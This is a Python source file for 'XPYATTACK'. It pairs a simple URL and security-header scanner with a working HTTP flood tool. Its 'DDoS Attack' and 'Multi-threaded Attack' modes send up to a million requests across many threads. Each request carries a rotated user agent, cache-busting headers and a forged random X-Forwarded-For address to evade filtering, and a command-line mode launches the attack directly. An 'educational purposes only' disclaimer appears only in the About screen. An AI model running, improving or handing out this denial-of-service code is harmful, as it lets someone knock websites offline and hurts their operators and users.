#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import urllib.request
import urllib.error
import time
import threading
import queue
import random
import sys
import os
import socket
import ssl
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin
from collections import Counter
import argparse

# Colors for CMD
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# User agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
]

# HTTP methods for variety
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']

class XPYAttack:
    def __init__(self):
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': None,
            'end_time': None,
            'response_times': [],
            'status_codes': Counter(),
            'errors': Counter()
        }
        self.running = False
        self.threads = []
        self.request_queue = queue.Queue()
        
    def clear_screen(self):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        """Print main banner"""
        banner = f"""
{RED}
    ╔╦╗╔═╗╔═╗╦  ╔═╗╔╦╗╔═╗╔╦╗╔═╗╔╗╔
     ║ ║╣ ╠═╝║  ╠═╣ ║ ╠═╣ ║ ║ ║║║║
     ╩ ╚═╝╩  ╩  ╩ ╩ ╩ ╩ ╩ ╩ ╚═╝╝╚╝
    ╔═══╗╔══╗╔═══╗╔══╗╔╗ ╔╗╔═══╗╔═══╗
    ║╔═╗║╚╣╠╝║╔══╝║╔╗║║║ ║║║╔══╝║╔═╗║
    ║╚═╝║ ║║ ║║╔═╗║╚╝║║╚═╝║║╚══╗║╚═╝║
    ║╔╗╔╝ ║║ ║║╚╗║║╔╗║║╔═╗║║╔══╝║╔╗╔╝
    ║║║╚╗╔╣╠╗║╚═╝║║║║║║║ ║║║╚══╗║║║╚╗
    ╚╝╚═╝╚══╝╚═══╝╚╝╚╝╚╝ ╚╝╚═══╝╚╝╚═╝
{RESET}
{CYAN}                  Advanced Security Testing Tool v2.0{RESET}                  
"""
        print(banner)

    def print_ascii(self):
        """Print ASCII art in red"""
        ascii_art = f"""
{RED}
╔╦╗╦╔═╗╔═╗╔╦╗╔═╗╔╦╗╔═╗╔╗╔╔╦╗
 ║ ║╚═╗╠═╣ ║ ╠═╣ ║ ║ ║║║║ ║ 
 ╩ ╩╚═╝╩ ╩ ╩ ╩ ╩ ╩ ╚═╝╝╚╝ ╩ 
╔═╗╔╦╗╔╦╗╔═╗╔╗╔╔═╗╔╦╗╔═╗
╠═╣ ║  ║ ╠═╣║║║╚═╗ ║ ║ ║
╩ ╩ ╩  ╩ ╩ ╩╝╚╝╚═╝ ╩ ╚═╝
╔╦╗╔═╗╔═╗╔╦╗╔╦╗╦ ╦╔╦╗╔═╗
 ║ ║ ║╠═╣ ║  ║ ╚╦╝ ║ ╠═╣
 ╩ ╚═╝╩ ╩ ╩  ╩  ╩  ╩ ╩ ╩
{RESET}
"""
        print(ascii_art)

    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            if all([result.scheme, result.netloc]):
                return True, result.scheme
            else:
                if not result.scheme:
                    test_url = "http://" + url
                    result = urlparse(test_url)
                    if all([result.scheme, result.netloc]):
                        return True, "http"
                return False, None
        except:
            return False, None

    def check_url_status(self, url):
        """Check URL status with detailed info"""
        try:
            # Prepare request with random user agent
            req = urllib.request.Request(url, method='HEAD')
            req.add_header('User-Agent', random.choice(USER_AGENTS))
            req.add_header('Accept', '*/*')
            req.add_header('Connection', 'keep-alive')
            
            # Try to connect
            start_time = time.time()
            response = urllib.request.urlopen(req, timeout=10)
            response_time = time.time() - start_time
            
            # Get server info
            server = response.headers.get('Server', 'Unknown')
            content_type = response.headers.get('Content-Type', 'Unknown')
            
            return {
                'status': 'online',
                'status_code': response.getcode(),
                'reason': 'OK',
                'url': response.geturl(),
                'scheme': urlparse(response.geturl()).scheme,
                'server': server,
                'content_type': content_type,
                'response_time': round(response_time, 3)
            }
        except urllib.error.HTTPError as e:
            return {
                'status': 'online',
                'status_code': e.code,
                'reason': e.reason,
                'url': url,
                'scheme': urlparse(url).scheme,
                'server': e.headers.get('Server', 'Unknown'),
                'response_time': 0
            }
        except urllib.error.URLError as e:
            return {'status': 'offline', 'error': f'Connection error: {str(e.reason)}'}
        except socket.timeout:
            return {'status': 'offline', 'error': 'Timeout - URL is slow or not responding'}
        except Exception as e:
            return {'status': 'error', 'error': f'Error: {str(e)}'}

    def advanced_scan(self, url):
        """Advanced URL scanning with multiple checks"""
        print(f"\n{BLUE}{BOLD}[*] Starting advanced scan on {url}{RESET}")
        
        results = {
            'basic_info': {},
            'security_headers': {},
            'technologies': [],
            'vulnerabilities': []
        }
        
        try:
            # Basic info
            results['basic_info'] = self.check_url_status(url)
            
            if results['basic_info']['status'] == 'online':
                # Get full headers
                req = urllib.request.Request(url, method='GET')
                req.add_header('User-Agent', random.choice(USER_AGENTS))
                response = urllib.request.urlopen(req, timeout=10)
                
                # Check security headers
                headers = response.headers
                security_headers = {
                    'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Not set'),
                    'Content-Security-Policy': headers.get('Content-Security-Policy', 'Not set'),
                    'X-Frame-Options': headers.get('X-Frame-Options', 'Not set'),
                    'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Not set'),
                    'X-XSS-Protection': headers.get('X-XSS-Protection', 'Not set'),
                    'Referrer-Policy': headers.get('Referrer-Policy', 'Not set')
                }
                results['security_headers'] = security_headers
                
                # Detect technologies
                server = headers.get('Server', '').lower()
                if 'apache' in server:
                    results['technologies'].append('Apache')
                if 'nginx' in server:
                    results['technologies'].append('Nginx')
                if 'iis' in server:
                    results['technologies'].append('IIS')
                if 'cloudflare' in server:
                    results['technologies'].append('Cloudflare')
                    
        except Exception as e:
            results['error'] = str(e)
            
        return results

    def worker(self, url, method='GET', delay=0):
        """Worker thread for sending requests"""
        while self.running:
            try:
                # Get request number from queue
                request_num = self.request_queue.get(timeout=1)
                
                # Prepare request
                req = urllib.request.Request(url, method=method)
                req.add_header('User-Agent', random.choice(USER_AGENTS))
                req.add_header('Accept', '*/*')
                req.add_header('Cache-Control', 'no-cache')
                req.add_header('Pragma', 'no-cache')
                
                # Add random headers for variety
                if random.choice([True, False]):
                    req.add_header('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
                
                # Send request
                start_time = time.time()
                response = urllib.request.urlopen(req, timeout=5)
                response_time = time.time() - start_time
                
                # Update stats
                self.stats['successful'] += 1
                self.stats['response_times'].append(response_time)
                self.stats['status_codes'][response.getcode()] += 1
                
                status_display = f"{GREEN}✓ Success (HTTP {response.getcode()}){RESET}"
                
            except urllib.error.HTTPError as e:
                self.stats['failed'] += 1
                self.stats['status_codes'][e.code] += 1
                status_display = f"{YELLOW}⚠ HTTP {e.code}{RESET}"
                
            except Exception as e:
                self.stats['failed'] += 1
                self.stats['errors'][str(e)[:50]] += 1
                status_display = f"{RED}✗ Failed{RESET}"
            
            finally:
                self.stats['total_requests'] += 1
                self.request_queue.task_done()
                
                # Print progress
                if self.stats['total_requests'] % 10 == 0:
                    print(f"{CYAN}[{self.stats['total_requests']:,}] {status_display} - "
                          f"Success: {self.stats['successful']} | Failed: {self.stats['failed']}{RESET}")
                
                if delay > 0:
                    time.sleep(delay)
                    
        self.request_queue.task_done()

    def multi_threaded_attack(self, url, num_requests=1000000, num_threads=50, method='GET', delay=0):
        """Multi-threaded attack"""
        print(f"\n{RED}{BOLD}[!] Starting multi-threaded attack on {url}{RESET}")
        print(f"{YELLOW}[*] Configuration:{RESET}")
        print(f"    - Total requests: {num_requests:,}")
        print(f"    - Threads: {num_threads}")
        print(f"    - Method: {method}")
        print(f"    - Delay: {delay} seconds\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Fill queue with request numbers
        for i in range(num_requests):
            self.request_queue.put(i)
        
        # Start threads
        for i in range(num_threads):
            thread = threading.Thread(target=self.worker, args=(url, method, delay))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Monitor progress
        try:
            last_total = 0
            while self.running and not self.request_queue.empty():
                time.sleep(1)
                current_total = self.stats['total_requests']
                speed = current_total - last_total
                last_total = current_total
                
                # Calculate average response time
                avg_response = 0
                if self.stats['response_times']:
                    avg_response = sum(self.stats['response_times'][-100:]) / min(100, len(self.stats['response_times']))
                
                # Clear line and print stats
                print(f"\r{WHITE}[Speed: {speed}/s | Total: {current_total:,}/{num_requests:,} | "
                      f"Success: {self.stats['successful']} | Failed: {self.stats['failed']} | "
                      f"Avg Response: {avg_response:.3f}s]{RESET}", end='')
                
                if current_total >= num_requests:
                    break
                    
        except KeyboardInterrupt:
            print(f"\n\n{RED}[!] Attack stopped by user{RESET}")
            
        finally:
            self.running = False
            self.stats['end_time'] = time.time()
            
            # Wait for threads to finish
            for thread in self.threads:
                thread.join(timeout=1)
            
            self.show_attack_stats()

    def show_attack_stats(self):
        """Show detailed attack statistics"""
        duration = self.stats['end_time'] - self.stats['start_time']
        avg_speed = self.stats['total_requests'] / duration if duration > 0 else 0
        
        print(f"\n\n{RED}{BOLD}[!] Attack Statistics:{RESET}")
        print(f"{CYAN}╔{'═'*50}╗{RESET}")
        print(f"{CYAN}║ {'Total Requests':<20} : {self.stats['total_requests']:<25,} ║{RESET}")
        print(f"{CYAN}║ {'Successful':<20} : {GREEN}{self.stats['successful']:<25,}{CYAN} ║{RESET}")
        print(f"{CYAN}║ {'Failed':<20} : {RED}{self.stats['failed']:<25,}{CYAN} ║{RESET}")
        print(f"{CYAN}║ {'Duration':<20} : {duration:.2f} seconds{' ' * 15} ║{RESET}")
        print(f"{CYAN}║ {'Average Speed':<20} : {avg_speed:.2f} req/s{' ' * 17} ║{RESET}")
        
        if self.stats['response_times']:
            avg_response = sum(self.stats['response_times']) / len(self.stats['response_times'])
            print(f"{CYAN}║ {'Avg Response Time':<20} : {avg_response:.3f} seconds{' ' * 13} ║{RESET}")
        
        print(f"{CYAN}╚{'═'*50}╝{RESET}")
        
        # Show status codes distribution
        if self.stats['status_codes']:
            print(f"\n{YELLOW}[*] Status Codes Distribution:{RESET}")
            for code, count in self.stats['status_codes'].most_common():
                color = GREEN if code < 400 else YELLOW if code < 500 else RED
                print(f"    {color}HTTP {code}: {count}{RESET}")
        
        # Show errors if any
        if self.stats['errors']:
            print(f"\n{RED}[!] Common Errors:{RESET}")
            for error, count in self.stats['errors'].most_common(5):
                print(f"    {RED}{error}: {count}{RESET}")

    def interactive_menu(self):
        """Interactive main menu"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"\n{BLUE}{BOLD}╔{'═'*50}╗{RESET}")
            print(f"{BLUE}{BOLD}║{' ' * 18}MAIN MENU{' ' * 24}║{RESET}")
            print(f"{BLUE}{BOLD}╚{'═'*50}╝{RESET}\n")
            
            print(f"{WHITE}[1] {CYAN}Single URL Scanner{RESET}")
            print(f"{WHITE}[2] {CYAN}Advanced URL Scan{RESET}")
            print(f"{WHITE}[3] {CYAN}DoS Attack {RESET}")
            print(f"{WHITE}[4] {CYAN}Multi-threaded Attack{RESET}")
            print(f"{WHITE}[5] {CYAN}Load URL List from File{RESET}")
            print(f"{WHITE}[6] {CYAN}Settings{RESET}")
            print(f"{WHITE}[7] {CYAN}About{RESET}")
            print(f"{WHITE}[8] {CYAN}Exit{RESET}")
            
            choice = input(f"\n{WHITE}{BOLD}Select option: {RESET}").strip()
            
            if choice == '1':
                self.url_scanner_menu()
            elif choice == '2':
                self.advanced_scan_menu()
            elif choice == '3':
                self.dos_attack_menu()
            elif choice == '4':
                self.multi_threaded_menu()
            elif choice == '5':
                self.load_urls_menu()
            elif choice == '6':
                self.settings_menu()
            elif choice == '7':
                self.about_menu()
            elif choice == '8':
                print(f"\n{GREEN}Thanks for using XPYATTACK!{RESET}")
                sys.exit(0)
            else:
                print(f"{RED}Invalid choice!{RESET}")
                time.sleep(1)

    def url_scanner_menu(self):
        """Simple URL scanner menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{BLUE}{BOLD}[ Single URL Scanner ]{RESET}\n")
        
        url = input(f"{WHITE}Enter URL to scan: {RESET}").strip()
        
        if not url:
            print(f"{RED}No URL entered!{RESET}")
            time.sleep(1)
            return
        
        is_valid, scheme = self.validate_url(url)
        if not is_valid:
            print(f"{RED}Invalid URL format!{RESET}")
            time.sleep(1)
            return
        
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        print(f"\n{BLUE}[*] Scanning {url}...{RESET}")
        result = self.check_url_status(url)
        
        print(f"\n{GREEN}[✓] Scan Results:{RESET}")
        if 'error' in result:
            print(f"{RED}Error: {result['error']}{RESET}")
        else:
            for key, value in result.items():
                color = GREEN if key == 'status' and value == 'online' else YELLOW
                print(f"    {color}{key.replace('_', ' ').title()}: {value}{RESET}")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

    def advanced_scan_menu(self):
        """Advanced scan menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{BLUE}{BOLD}[ Advanced URL Scan ]{RESET}\n")
        
        url = input(f"{WHITE}Enter URL for advanced scan: {RESET}").strip()
        
        if not url:
            print(f"{RED}No URL entered!{RESET}")
            time.sleep(1)
            return
        
        is_valid, scheme = self.validate_url(url)
        if not is_valid:
            print(f"{RED}Invalid URL format!{RESET}")
            time.sleep(1)
            return
        
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        results = self.advanced_scan(url)
        
        print(f"\n{GREEN}[✓] Advanced Scan Results:{RESET}")
        print(f"{CYAN}╔{'═'*50}╗{RESET}")
        
        if 'basic_info' in results:
            print(f"{CYAN}║ {'Basic Information':^50} ║{RESET}")
            print(f"{CYAN}╠{'═'*50}╣{RESET}")
            for key, value in results['basic_info'].items():
                if key != 'status':
                    print(f"{CYAN}║ {key.replace('_', ' ').title():<20}: {str(value):<28} ║{RESET}")
        
        if results.get('security_headers'):
            print(f"{CYAN}╠{'═'*50}╣{RESET}")
            print(f"{CYAN}║ {'Security Headers':^50} ║{RESET}")
            print(f"{CYAN}╠{'═'*50}╣{RESET}")
            for header, value in results['security_headers'].items():
                status = GREEN if value != 'Not set' else RED
                print(f"{CYAN}║ {header:<25}: {status}{value:<22}{CYAN} ║{RESET}")
        
        if results.get('technologies'):
            print(f"{CYAN}╠{'═'*50}╣{RESET}")
            print(f"{CYAN}║ {'Detected Technologies':^50} ║{RESET}")
            print(f"{CYAN}╠{'═'*50}╣{RESET}")
            techs = ', '.join(results['technologies'])
            print(f"{CYAN}║ {techs:<48} ║{RESET}")
        
        print(f"{CYAN}╚{'═'*50}╝{RESET}")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

    def dos_attack_menu(self):
        """Simple DDoS attack menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{RED}{BOLD}[ DDoS Attack ]{RESET}\n")
        
        url = input(f"{WHITE}Enter target URL: {RESET}").strip()
        
        if not url:
            print(f"{RED}No URL entered!{RESET}")
            time.sleep(1)
            return
        
        is_valid, scheme = self.validate_url(url)
        if not is_valid:
            print(f"{RED}Invalid URL format!{RESET}")
            time.sleep(1)
            return
        
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        try:
            num_requests = int(input(f"{WHITE}Number of requests (default 1000000): {RESET}").strip() or "1000000")
        except:
            num_requests = 1000000
        
        confirm = input(f"\n{RED}{BOLD}Start attack on {url}? (y/n): {RESET}").strip().lower()
        
        if confirm == 'y':
            attack = XPYAttack()
            attack.ddos_attack(url, num_requests)
        else:
            print(f"{YELLOW}Attack cancelled{RESET}")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

    def multi_threaded_menu(self):
        """Multi-threaded attack menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{RED}{BOLD}[ Multi-threaded Attack ]{RESET}\n")
        
        url = input(f"{WHITE}Enter target URL: {RESET}").strip()
        
        if not url:
            print(f"{RED}No URL entered!{RESET}")
            time.sleep(1)
            return
        
        is_valid, scheme = self.validate_url(url)
        if not is_valid:
            print(f"{RED}Invalid URL format!{RESET}")
            time.sleep(1)
            return
        
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        try:
            num_requests = int(input(f"{WHITE}Total requests (default 1000000): {RESET}").strip() or "1000000")
            num_threads = int(input(f"{WHITE}Number of threads (default 50): {RESET}").strip() or "50")
            delay = float(input(f"{WHITE}Delay between requests (default 0): {RESET}").strip() or "0")
            
            print(f"\n{YELLOW}HTTP Methods:{RESET}")
            print(f"1. GET (default)")
            print(f"2. POST")
            print(f"3. HEAD")
            print(f"4. Random")
            
            method_choice = input(f"{WHITE}Select method: {RESET}").strip()
            if method_choice == '2':
                method = 'POST'
            elif method_choice == '3':
                method = 'HEAD'
            elif method_choice == '4':
                method = 'RANDOM'
            else:
                method = 'GET'
            
        except:
            print(f"{RED}Invalid input! Using defaults{RESET}")
            num_requests = 1000000
            num_threads = 50
            delay = 0
            method = 'GET'
        
        confirm = input(f"\n{RED}{BOLD}Start multi-threaded attack? (y/n): {RESET}").strip().lower()
        
        if confirm == 'y':
            self.multi_threaded_attack(url, num_requests, num_threads, method, delay)
        else:
            print(f"{YELLOW}Attack cancelled{RESET}")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

    def load_urls_menu(self):
        """Load URLs from file menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{BLUE}{BOLD}[ Load URL List from File ]{RESET}\n")
        
        filename = input(f"{WHITE}Enter filename (default: urls.txt): {RESET}").strip() or "urls.txt"
        
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"\n{GREEN}Loaded {len(urls)} URLs{RESET}")
            
            for i, url in enumerate(urls[:10], 1):
                print(f"  {i}. {url}")
            
            if len(urls) > 10:
                print(f"  ... and {len(urls) - 10} more")
            
            # Scan option
            scan_now = input(f"\n{WHITE}Scan these URLs now? (y/n): {RESET}").strip().lower()
            if scan_now == 'y':
                for url in urls:
                    print(f"\n{BLUE}[*] Scanning {url}...{RESET}")
                    result = self.check_url_status(url)
                    if 'error' in result:
                        print(f"{RED}  {result['error']}{RESET}")
                    else:
                        print(f"{GREEN}  Status: {result['status_code']} - {result.get('server', 'Unknown')}{RESET}")
            
        except FileNotFoundError:
            print(f"{RED}File not found: {filename}{RESET}")
        except Exception as e:
            print(f"{RED}Error: {str(e)}{RESET}")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

    def settings_menu(self):
        """Settings menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{YELLOW}{BOLD}[ Settings ]{RESET}\n")
        
        print(f"1. Default timeout: 10 seconds")
        print(f"2. Default user agents: {len(USER_AGENTS)}")
        print(f"3. Save logs to file: Disabled")
        print(f"4. Verbose mode: Enabled")
        print(f"5. Back to main menu")
        
        choice = input(f"\n{WHITE}Select option: {RESET}").strip()
        
        print(f"\n{YELLOW}Settings feature coming soon!{RESET}")
        time.sleep(1)

    def about_menu(self):
        """About menu"""
        self.clear_screen()
        self.print_ascii()
        
        print(f"\n{CYAN}{BOLD}[ About XPYATTACK ]{RESET}\n")
        print(f"Version: 2.0")
        print(f"Author: XPYATTACK Team")
        print(f"Purpose: Educational Security Testing Tool")
        print(f"\n{YELLOW}DISCLAIMER:{RESET}")
        print(f"This tool is for educational purposes only.")
        print(f"Use only on systems you own or have permission to test.")
        print(f"Misuse of this tool may violate laws and regulations.")
        print(f"\n{BLUE}Features:{RESET}")
        print(f"✓ URL Validation & Scanning")
        print(f"✓ Advanced Security Analysis")
        print(f"✓ Multi-threaded Attack Simulation")
        print(f"✓ Real-time Statistics")
        print(f"✓ Color-coded Output")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

    def ddos_attack(self, url, num_requests=1000000):
        """Simple DDoS simulation (backward compatibility)"""
        print(f"\n{RED}{BOLD}[!] Starting attack on {url}{RESET}")
        print(f"{YELLOW}[*] Sending {num_requests:,} requests...{RESET}\n")
        
        successful = 0
        failed = 0
        
        for i in range(1, num_requests + 1):
            success, status_code = self.send_simple_request(url)
            
            if success:
                successful += 1
                status = f"{GREEN}✓ Success (HTTP {status_code}){RESET}"
            else:
                failed += 1
                status = f"{RED}✗ Failed{RESET}"
            
            print(f"{CYAN}[{i:,}/{num_requests:,}] {YELLOW}Send Request{RESET} - {status}")
            
            if i % 100 == 0:
                print(f"{MAGENTA}[✓] Sent {i:,} requests - Success: {successful} | Failed: {failed}{RESET}")
                time.sleep(0.1)
        
        print(f"\n{RED}{BOLD}[!] Attack finished!{RESET}")
        print(f"{GREEN}[✓] Total requests: {num_requests:,}{RESET}")
        print(f"{GREEN}[✓] Successful requests: {successful:,}{RESET}")
        print(f"{RED}[✗] Failed requests: {failed:,}{RESET}")

    def send_simple_request(self, url):
        """Simple request for backward compatibility"""
        try:
            req = urllib.request.Request(url, method='GET')
            req.add_header('User-Agent', random.choice(USER_AGENTS))
            response = urllib.request.urlopen(req, timeout=2)
            return True, response.getcode()
        except urllib.error.HTTPError as e:
            return True, e.code
        except:
            return False, None

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(description='XPYATTACK Security Testing Tool')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-m', '--mode', choices=['scan', 'advanced', 'attack', 'multi'], 
                       default='interactive', help='Operation mode')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('-n', '--requests', type=int, default=1000000, help='Number of requests')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between requests')
    
    args = parser.parse_args()
    
    tool = XPYAttack()
    
    if args.url and args.mode != 'interactive':
        # Non-interactive mode
        tool.clear_screen()
        tool.print_banner()
        
        if not args.url.startswith(('http://', 'https://')):
            args.url = f"http://{args.url}"
        
        if args.mode == 'scan':
            result = tool.check_url_status(args.url)
            print(f"\n{GREEN}[✓] Scan Results:{RESET}")
            for key, value in result.items():
                print(f"    {key}: {value}")
                
        elif args.mode == 'advanced':
            results = tool.advanced_scan(args.url)
            print(f"\n{GREEN}[✓] Advanced Scan Results:{RESET}")
            print(json.dumps(results, indent=2))
            
        elif args.mode == 'attack':
            tool.ddos_attack(args.url, args.requests)
            
        elif args.mode == 'multi':
            tool.multi_threaded_attack(args.url, args.requests, args.threads, 'GET', args.delay)
    else:
        # Interactive mode
        try:
            tool.interactive_menu()
        except KeyboardInterrupt:
            print(f"\n\n{RED}{BOLD}[!] Program stopped by user{RESET}")
            sys.exit(0)

if __name__ == "__main__":
    main()